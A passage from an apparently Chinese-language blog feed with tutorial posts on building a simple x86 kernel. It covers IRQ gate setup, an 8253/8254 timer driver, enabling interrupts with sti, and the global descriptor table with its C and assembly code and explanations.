<li><code>push 0</code>：对于某些中断（如除错、溢出等），<strong>CPU 会自动压入错误代码；对于不会自动压入错误代码的中断（如外部中断），为了统一处理流程，在这里手动压入一个占位的错误代码。</strong></li>
<li><code>push %2</code>：压入中断向量编号，供中断处理程序使用。</li>
<li><code>jmp irq_common_stub</code>：<strong>跳转到通用的中断处理代码。</strong></li>
</ul>
<blockquote>
<p>idt&#x2F;idt.c  构造irq相关的 描述符和 具体的irq函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">	idt_set_gate(<span class="number">32</span>, (<span class="type">uint32_t</span>)irq0, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">33</span>, (<span class="type">uint32_t</span>)irq1, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">34</span>, (<span class="type">uint32_t</span>)irq2, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">35</span>, (<span class="type">uint32_t</span>)irq3, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">36</span>, (<span class="type">uint32_t</span>)irq4, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">37</span>, (<span class="type">uint32_t</span>)irq5, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">38</span>, (<span class="type">uint32_t</span>)irq6, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">39</span>, (<span class="type">uint32_t</span>)irq7, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">40</span>, (<span class="type">uint32_t</span>)irq8, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">41</span>, (<span class="type">uint32_t</span>)irq9, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">42</span>, (<span class="type">uint32_t</span>)irq10, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">43</span>, (<span class="type">uint32_t</span>)irq11, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">44</span>, (<span class="type">uint32_t</span>)irq12, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">45</span>, (<span class="type">uint32_t</span>)irq13, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">46</span>, (<span class="type">uint32_t</span>)irq14, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">47</span>, (<span class="type">uint32_t</span>)irq15, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// IRQ 处理函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq_handler</span><span class="params">(pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 发送中断结束信号给 PICs</span></span><br><span class="line">	<span class="comment">// 按照我们的设置，从 32 号中断起为用户自定义中断</span></span><br><span class="line">	<span class="comment">// 因为单片的 Intel 8259A 芯片只能处理 8 级中断</span></span><br><span class="line">	<span class="comment">// 故大于等于 40 的中断号是由从片处理的</span></span><br><span class="line">	<span class="keyword">if</span> (regs-&gt;int_no &gt;= <span class="number">40</span>) &#123;</span><br><span class="line">		<span class="comment">// 发送重设信号给从片</span></span><br><span class="line">		outb(<span class="number">0xA0</span>, <span class="number">0x20</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 发送重设信号给主片</span></span><br><span class="line">	outb(<span class="number">0x20</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (interrupt_handlers[regs-&gt;int_no]) &#123;</span><br><span class="line">		interrupt_handlers[regs-&gt;int_no](regs);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><strong>ISR 和 iRQ 的处理过程：</strong></p>
<ul>
<li>ISR的处理过程是 (isr0 - isr31) -&gt; isr_common_stub（相同的处理部分） -&gt; isr_handler -&gt; 具体的ISR处理函数。</li>
<li>IRQ的处理过程是 (irq0 - irq15) -&gt; irq_common_stub -&gt; irq_hanlder -&gt; 具体的IRQ处理函数。</li>
</ul>
<h2 id="8-2-时钟中断和产生处理"><a href="#8-2-时钟中断和产生处理" class="headerlink" title="8.2 时钟中断和产生处理"></a>8.2 时钟中断和产生处理</h2><p>配置8253&#x2F;8254 timer 芯片</p>
<blockquote>
<p>drivers&#x2F;timer.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;timer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">timer_callback</span><span class="params">(pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">uint32_t</span> tick = <span class="number">0</span>;</span><br><span class="line">	printk_color(rc_black, rc_red, <span class="string">&quot;Tick: %d\n&quot;</span>, tick++);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_timer</span><span class="params">(<span class="type">uint32_t</span> frequency)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 注册时间相关的处理函数</span></span><br><span class="line">	register_interrupt_handler(IRQ0, timer_callback);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Intel 8253/8254 PIT芯片 I/O端口地址范围是40h~43h</span></span><br><span class="line">	<span class="comment">// 输入频率为 1193180，frequency 即每秒中断次数</span></span><br><span class="line">	<span class="type">uint32_t</span> divisor = <span class="number">1193180</span> / frequency;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// D7 D6 D5 D4 D3 D2 D1 D0</span></span><br><span class="line">	<span class="comment">// 0  0  1  1  0  1  1  0</span></span><br><span class="line">	<span class="comment">// 即就是 36 H</span></span><br><span class="line">	<span class="comment">// 设置 8253/8254 芯片工作在模式 3 下</span></span><br><span class="line">	outb(<span class="number">0x43</span>, <span class="number">0x36</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 拆分低字节和高字节</span></span><br><span class="line">	<span class="type">uint8_t</span> low = (<span class="type">uint8_t</span>)(divisor &amp; <span class="number">0xFF</span>);</span><br><span class="line">	<span class="type">uint8_t</span> hign = (<span class="type">uint8_t</span>)((divisor &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 分别写入低字节和高字节</span></span><br><span class="line">	outb(<span class="number">0x40</span>, low);</span><br><span class="line">	outb(<span class="number">0x40</span>, hign);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">timer_callback</span><span class="params">(pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">uint32_t</span> tick = <span class="number">0</span>;</span><br><span class="line">	printk_color(rc_black, rc_red, <span class="string">&quot;Tick: %d\n&quot;</span>, tick++);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>回调函数</p>
<ul>
<li><p>tick 静态成员变量 用来记录中断发生的次数</p>
</li>
<li><p><strong><code>printk_color(rc_black, rc_red, &quot;Tick: %d\n&quot;, tick++);</code></strong>: 在屏幕上打印当前的tick数，并以红色字体显示。每调用一次这个函数，<code>tick</code> 的值就增加1。</p>
</li>
</ul>
</blockquote>
<blockquote>
<p>include&#x2F;timer.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_TIMER_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_TIMER_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="comment">// 定时器每秒钟触发中断的次数。</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_timer</span><span class="params">(<span class="type">uint32_t</span> frequency)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> 	<span class="comment">// INCLUDE_TIMER_H_</span></span></span><br></pre></td></tr></table></figure>



<h2 id="修改入口函数-1"><a href="#修改入口函数-1" class="headerlink" title="修改入口函数"></a>修改入口函数</h2><blockquote>
<p>init&#x2F;entry.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;console.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gdt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;timer.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kern_entry</span><span class="params">()</span>&#123;</span><br><span class="line">    init_debug();</span><br><span class="line">    init_gdt();</span><br><span class="line">    init_idt();</span><br><span class="line"></span><br><span class="line">    console_clear();</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    printk_color(rc_black, rc_green, <span class="string">&quot;Hello OS!!!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    init_timer(<span class="number">200</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 触发中断</span></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;sti&quot;</span>)</span>; <span class="comment">// </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>asm volatile(&quot;sti&quot;)</code></strong>   通常在系统末尾调用</p>
<ul>
<li>在汇编语言中，<code>sti</code> 指令的作用是设置中断标志（Set Interrupt Flag）</li>
<li>在操作系统启动过程中，中断通常在执行初期阶段被禁用（通常使用 <code>cli</code> 指令，即 Clear Interrupt Flag），以避免在系统未完全配置好时响应中断，这可能导致不稳定或错误。</li>
<li>在系统的关键组件如GDT、IDT和定时器等被初始化和配置好之后，使用 <code>sti</code> 指令允许中断，是为了启动正常的中断处理，这对于系统的进一步功能如多任务处理、响应外部设备请求等是必要的。</li>
</ul>
<p><img src="/2024/05/10/x86-4-%E4%B8%AD%E6%96%AD%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20240512205003803.png" alt="image-20240512205003803"></p>
]]></content>
      <categories>
        <category>x86内核实现</category>
      </categories>
      <tags>
        <tag>x86</tag>
        <tag>linxu</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>基于x86架构的简单内核实现-3-全局段描述符表</title>
    <url>/2024/05/10/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0-3-%E5%85%A8%E5%B1%80%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="6-添加全局段描述符表"><a href="#6-添加全局段描述符表" class="headerlink" title="6.添加全局段描述符表"></a>6.添加全局段描述符表</h1><h2 id="6-1保护模式"><a href="#6-1保护模式" class="headerlink" title="6.1保护模式"></a>6.1保护模式</h2><p>保护模式需要对内存段的性质和允许的操作给出定义，以实 现对特定内存段的访问检测和数据保护</p>
<p>80386中原先的 AX，BX，CX，DX，SI，DI，SP，BP从16位扩展（Extend）到了32位，并改名EAX，EBX， ECX，EDX，ESI，EDI，ESP，EBP，<strong>E就是Extend</strong>的意思。</p>
<blockquote>
<p>8036<strong>保护模式下的分段</strong></p>
<p>8036 虽然采用分段的方式进行寻址，但是 只是分了一个段</p>
<p><strong>即段基址为0x00000000， 短长为0xFFFFFFFF（4GB）</strong></p>
</blockquote>
<p>32位的保护模式下，对一个内存段的描述需要8个字节 — 段描述符  （8字节 &#x3D; 64位）</p>
<blockquote>
<p>段描述符又分为：数据段描述符，指令段描述符和系统段描述符三种</p>
</blockquote>
<img src="/2024/05/10/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0-3-%E5%85%A8%E5%B1%80%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8/image-20240510181329916.png" alt="image-20240510181329916" style="zoom:67%;">



<p>描述符表：在<strong>内存中</strong>存放在描述符的集合</p>
<blockquote>
<p>intel 直接设置了一个48位的全局描述符表寄存器（GDTR）来保存描述符表的信息</p>
</blockquote>
<img src="/2024/05/10/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0-3-%E5%85%A8%E5%B1%80%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8/image-20240510200652839.png" alt="image-20240510200652839" style="zoom:67%;">

<p>16位来表示表的长度，那么2的16次方就是65536字节，除以每一个描述符的8字 节，<strong>那么最多能创建8192个描述符</strong></p>
<blockquote>
<p><strong>现代操作系统不在使用分段，而是直接使用分页技术</strong></p>
<p>分页只是保护模式下的一种内存管理策略</p>
</blockquote>
<h2 id="6-2分段策略-gdt-h"><a href="#6-2分段策略-gdt-h" class="headerlink" title="6.2分段策略 - gdt.h"></a>6.2分段策略 - gdt.h</h2><p>GRUB 在载入内核时候的一些状态</p>
<blockquote>
<ol>
<li><p>CS 指向基地址为 0x00000000，限长为4G – 1的<strong>代码段描述符</strong>。 </p>
</li>
<li><p>DS，SS，ES，FS 和 GS 指向基地址为0x00000000，限长为4G–1的<strong>数据段描述符</strong>。</p>
</li>
</ol>
</blockquote>
<p>在内核中实现GDT 全局描述符表</p>
<blockquote>
<p>include&#x2F;gdt.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_GDT_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_GDT_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局描述符类型  具体多少位 对应可以看上述的图 共8字节 64位</span></span><br><span class="line"><span class="keyword">typedef</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gdt_entry_t</span> &#123;</span></span><br><span class="line">	<span class="type">uint16_t</span> limit_low;     <span class="comment">// 段界限   15～0</span></span><br><span class="line">	<span class="type">uint16_t</span> base_low;      <span class="comment">// 段基地址 15～0</span></span><br><span class="line">	<span class="type">uint8_t</span>  base_middle;   <span class="comment">// 段基地址 23～16</span></span><br><span class="line">	<span class="type">uint8_t</span>  access;        <span class="comment">// 段存在位、描述符特权级、描述符类型、描述符子类别</span></span><br><span class="line">	<span class="type">uint8_t</span>  granularity; 	<span class="comment">// 其他标志、段界限 19～16</span></span><br><span class="line">	<span class="type">uint8_t</span>  base_high;     <span class="comment">// 段基地址 31～24</span></span><br><span class="line">&#125; __attribute__((packed)) <span class="type">gdt_entry_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GDTR  48位</span></span><br><span class="line"><span class="keyword">typedef</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gdt_ptr_t</span> &#123;</span></span><br><span class="line">	<span class="type">uint16_t</span> limit; 	<span class="comment">// 全局描述符表限长 16位</span></span><br><span class="line">	<span class="type">uint32_t</span> base; 		<span class="comment">// 全局描述符表 32位 基地址</span></span><br><span class="line">&#125; __attribute__((packed)) <span class="type">gdt_ptr_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化全局描述符表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_gdt</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GDT 加载到 GDTR 的函数[汇编实现]</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">gdt_flush</span><span class="params">(<span class="type">uint32_t</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> 	<span class="comment">// INCLUDE_GDT_H_</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p><code>__attribute__((packed))</code></p>
<p> 是一个由GCC提供的特殊属性，用于指示编译器如何在内存中布局结构体或联合体的成员。使用这个属性可以<strong>确保编译器生成的数据结构不进行任何自动的内存对齐</strong>，而是严格按照成员声明的顺序将它们紧密地打包在一起。</p>
</blockquote>
<p><strong>函数实现</strong></p>
<blockquote>
<p>gdt&#x2F;gdt.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gdt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局描述符表长度</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDT_LENGTH 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局描述符表定义</span></span><br><span class="line"><span class="type">gdt_entry_t</span> gdt_entries[GDT_LENGTH];</span><br><span class="line"></span><br><span class="line"><span class="comment">// GDTR</span></span><br><span class="line"><span class="type">gdt_ptr_t</span> gdt_ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局描述符表构造函数，根据下标构造  参数 GDT表中索引， 段基地址， 段的大小限制， 段的类型 特权级等，段的颗粒度。 </span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">gdt_set_gate</span><span class="params">(<span class="type">int32_t</span> num, <span class="type">uint32_t</span> base, <span class="type">uint32_t</span> limit, <span class="type">uint8_t</span> access, <span class="type">uint8_t</span> gran)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明内核栈地址</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">uint32_t</span> <span class="built_in">stack</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化全局描述符表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_gdt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 全局描述符表界限 e.g. 从 0 开始，所以总长要 - 1</span></span><br><span class="line">	gdt_ptr.limit = <span class="keyword">sizeof</span>(<span class="type">gdt_entry_t</span>) * GDT_LENGTH - <span class="number">1</span>;</span><br><span class="line">	gdt_ptr.base = (<span class="type">uint32_t</span>)&amp;gdt_entries;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 采用 Intel 平坦模型   5个 gdt</span></span><br><span class="line">	gdt_set_gate(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);             	<span class="comment">// 按照 Intel 文档要求，第一个描述符必须全 0</span></span><br><span class="line">	gdt_set_gate(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0x9A</span>, <span class="number">0xCF</span>); 	<span class="comment">// 指令段</span></span><br><span class="line">	gdt_set_gate(<span class="number">2</span>, <span class="number">0</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0x92</span>, <span class="number">0xCF</span>); 	<span class="comment">// 数据段</span></span><br><span class="line">	gdt_set_gate(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0xFA</span>, <span class="number">0xCF</span>); 	<span class="comment">// 用户模式代码段</span></span><br><span class="line">	gdt_set_gate(<span class="number">4</span>, <span class="number">0</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0xF2</span>, <span class="number">0xCF</span>); 	<span class="comment">// 用户模式数据段</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 加载全局描述符表地址到 GPTR 寄存器</span></span><br><span class="line">	gdt_flush((<span class="type">uint32_t</span>)&amp;gdt_ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局描述符表构造函数，根据下标构造</span></span><br><span class="line"><span class="comment">// 参数分别是 数组下标、基地址、限长、访问标志，其它访问标志</span></span><br><span class="line"><span class="comment">/* 结构体定义如下：</span></span><br><span class="line"><span class="comment">typedef struct</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	uint16_t limit_low;     // 段界限   15～0</span></span><br><span class="line"><span class="comment">	uint16_t base_low;      // 段基地址 15～0</span></span><br><span class="line"><span class="comment">	uint8_t  base_middle;   // 段基地址 23～16</span></span><br><span class="line"><span class="comment">	uint8_t  access;        // 段存在位、描述符特权级、描述符类型、描述符子类别</span></span><br><span class="line"><span class="comment">	uint8_t  granularity; 	// 其他标志、段界限 19～16</span></span><br><span class="line"><span class="comment">	uint8_t  base_high;     // 段基地址 31～24</span></span><br><span class="line"><span class="comment">&#125; __attribute__((packed)) gdt_entry_t;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">gdt_set_gate</span><span class="params">(<span class="type">int32_t</span> num, <span class="type">uint32_t</span> base, <span class="type">uint32_t</span> limit, <span class="type">uint8_t</span> access, <span class="type">uint8_t</span> gran)</span></span><br><span class="line">&#123;</span><br><span class="line">	gdt_entries[num].base_low     = (base &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">	gdt_entries[num].base_middle  = (base &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">	gdt_entries[num].base_high    = (base &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line">	gdt_entries[num].limit_low    = (limit &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">	gdt_entries[num].granularity  = (limit &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line"></span><br><span class="line">	gdt_entries[num].granularity |= gran &amp; <span class="number">0xF0</span>;</span><br><span class="line">	gdt_entries[num].access       = access;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>GDT_LENGTH 5</strong>  — 为什么是5</p>
<p>在典型的x86保护模式操作系统中，这些段通常包括：</p>
<ol>
<li><strong>空描述符（Null Descriptor）</strong>:<ul>
<li>按照Intel的规定，GDT的第一个条目必须是一个空描述符。这不是用于实际的内存段，但它有助于捕捉到无效的段选择器访问，因为任何尝试访问索引为0的描述符的操作都会导致异常。</li>
</ul>
</li>
<li><strong>内核代码段（Kernel Code Segment）</strong>:<ul>
<li>用于操作系统内核代码的执行。这通常是特权级0的代码段，只能由内核访问。</li>
</ul>
</li>
<li><strong>内核数据段（Kernel Data Segment）</strong>:<ul>
<li>用于操作系统内核数据。这也是特权级0的数据段。</li>
</ul>
</li>
<li><strong>用户代码段（User Code Segment）</strong>:<ul>
<li>用于用户模式程序的代码执行。这是特权级3的代码段，允许用户级应用程序执行。</li>
</ul>
</li>
<li><strong>用户数据段（User Data Segment）</strong>:<ul>
<li>用于用户模式程序的数据。这同样是特权级3的数据段。</li>
</ul>
</li>
</ol>
<p>定义这5个条目是为了确保操作系统能够正确区分内核模式和用户模式，同时处理用户程序和内核之间的权限切换。这种分隔是现代操作系统安全性和稳定性的关键，因为它防止了用户程序直接访问内核资源和其他敏感数据。</p>
<blockquote>
<p>gdt&#x2F;gdt_s.s</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[GLOBAL gdt_flush]</span><br><span class="line"></span><br><span class="line">gdt_flush:</span><br><span class="line">	mov eax, [esp+4]  ; 参数存入 eax 寄存器</span><br><span class="line">	lgdt [eax]        ; 加载到 GDTR [修改原先GRUB设置]</span><br><span class="line"></span><br><span class="line">	mov ax, 0x10      ; 加载我们的数据段描述符</span><br><span class="line">	mov ds, ax        ; 更新所有可以更新的段寄存器</span><br><span class="line">	mov es, ax</span><br><span class="line">	mov fs, ax</span><br><span class="line">	mov gs, ax</span><br><span class="line">	mov ss, ax</span><br><span class="line">	jmp 0x08:.flush   ; 远跳转，0x08是我们的代码段描述符</span><br><span class="line">			  ; 远跳目的是清空流水线并串行化处理器</span><br><span class="line">.flush:</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>获取参数并加载GDT</strong><ul>
<li><code>mov eax, [esp+4]</code>: 这条指令从栈中获取函数参数。在C语言调用汇编时，参数通常通过栈传递。<code>[esp+4]</code> 表示取栈指针 <code>esp</code> 向上偏移4个字节的位置的值（因为 <code>esp</code> 指向的是返回地址），这里保存的是传递给 <code>gdt_flush</code> 函数的参数，即新GDT的地址。</li>
<li><code>lgdt [eax]</code>: <code>lgdt</code> 是加载全局描述符表寄存器（GDTR）的指令。<code>[eax]</code> 表示使用 <code>eax</code> 寄存器中的地址来加载GDTR。这里的地址指向一个 <code>gdt_ptr</code> 结构，其中包含了GDT的长度和基址。</li>
</ul>
</li>
<li><strong>更新段寄存器</strong><ul>
<li><code>mov ax, 0x10</code>: 将16进制值 <code>0x10</code> 移动到 <code>ax</code> 寄存器。这个值是数据段的选择子（selector），在GDT中的偏移量。这通常指向GDT中的第二个条目（首个条目是空描述符），这里定义为内核数据段。</li>
<li><code>mov ds, ax</code>、<code>mov es, ax</code>、<code>mov fs, ax</code>、<code>mov gs, ax</code>、<code>mov ss, ax</code>: 这些指令将数据段选择子加载到所有数据段寄存器（<code>ds</code>, <code>es</code>, <code>fs</code>, <code>gs</code>, <code>ss</code>）。这样确保所有的段寄存器都指向正确的段描述符，对应新的GDT设置。</li>
</ul>
</li>
<li><strong>远跳转以更新代码段寄存器和清空流水线</strong><ul>
<li><code>jmp 0x08:.flush</code>: 执行一个远跳转到同一代码段中的<code>.flush</code>标签。<code>0x08</code> 是代码段的选择子（在GDT中的位置），这里通常指向GDT的第一个代码段描述符。<strong>远跳转不仅跳转到指定的代码段，还强制CPU清空预取队列和流水线，并且实际上更新了CPU的内部结构，使代码段寄存器（<code>cs</code>）与新的GDT同步。</strong></li>
<li><code>.flush:</code>: 这是远跳转的目标位置，紧跟着的 <code>ret</code> 指令会返回到调用 <code>gdt_flush</code> 的代码中。</li>
</ul>
</li>
</ol>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">// 在调用 gdt_flush 函数之前，调用者（可能是C语言的初始化代码）将参数（gdt_ptr 的地址）压入栈中，并调用 gdt_flush 函数。栈的结构大致如下：</span><br><span class="line"><span class="addition">+-----------------+   &lt;- ESP (栈指针)</span></span><br><span class="line">|   参数：&amp;gdt_ptr   |</span><br><span class="line"><span class="addition">+-----------------+</span></span><br><span class="line">|   返回地址       |</span><br><span class="line"><span class="addition">+-----------------+</span></span><br><span class="line">|   调用者的局部变量  |</span><br><span class="line"><span class="addition">+-----------------+</span></span><br><span class="line">|   ...            |</span><br><span class="line"></span><br><span class="line">// 当 gdt_flush 函数被调用时，CPU自动将返回地址（即调用 gdt_flush 之后的下一条指令的地址）压入栈中。此时，ESP 指向栈中的返回地址。</span><br><span class="line"><span class="addition">+-----------------+   &lt;- ESP (新的栈指针位置)</span></span><br><span class="line">|   返回地址       |</span><br><span class="line"><span class="addition">+-----------------+</span></span><br><span class="line">|   参数：&amp;gdt_ptr   |</span><br><span class="line"><span class="addition">+-----------------+</span></span><br><span class="line">|   调用者的局部变量  |</span><br><span class="line"><span class="addition">+-----------------+</span></span><br><span class="line">|   ...            |</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p>修改 entry.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;console.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gdt.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kern_entry</span><span class="params">()</span>&#123;</span><br><span class="line">    init_debug();</span><br><span class="line">    init_gdt();</span><br><span class="line">    </span><br><span class="line">    console_clear();</span><br><span class="line">	<span class="comment">//console_write_color(&quot;Hello, OS kernel!\n&quot;, rc_black, rc_green);</span></span><br><span class="line">    <span class="comment">//panic(&quot;test&quot;);</span></span><br><span class="line">    </span><br><span class="line">    printk_color(rc_blue, rc_red, <span class="string">&quot;Hello OS!!!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span 